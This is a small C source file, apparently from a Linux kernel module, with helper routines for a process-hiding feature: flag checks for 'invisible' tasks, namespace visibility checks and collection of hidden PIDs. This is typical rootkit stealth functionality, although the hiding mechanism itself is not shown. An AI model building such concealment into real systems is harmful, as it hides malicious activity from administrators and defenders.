#include "memd_proc.h"
#include "memd_hide.h"

int is_invisible(pid_t pid) {
    struct task_struct* task;
    if (!pid)
        return 0;
    task = find_task_by_vpid(pid);
    if (!task)
        return 0;
    if (task->flags & PF_INVISIBLE)
        return 1;
    return 0;
}

bool memd_hide_check_visibility(pid_t pid, struct pid_namespace *ns)
 {
    if (!ns)
        ns = &init_pid_ns;
    return memd_hide_contains_ns(pid, ns);
}

int memd_hide_get_hidden_pids(pid_t *buf, size_t buf_size, size_t *count)
 {
    return memd_hide_collect_pids(buf, buf_size, count, NULL);
}

int memd_hide_get_ns_hidden_pids(pid_t *buf, size_t buf_size, size_t *count, struct pid_namespace *ns)
 {
    if (!ns)
        return -EINVAL;
    return memd_hide_collect_pids(buf, buf_size, count, ns);
}
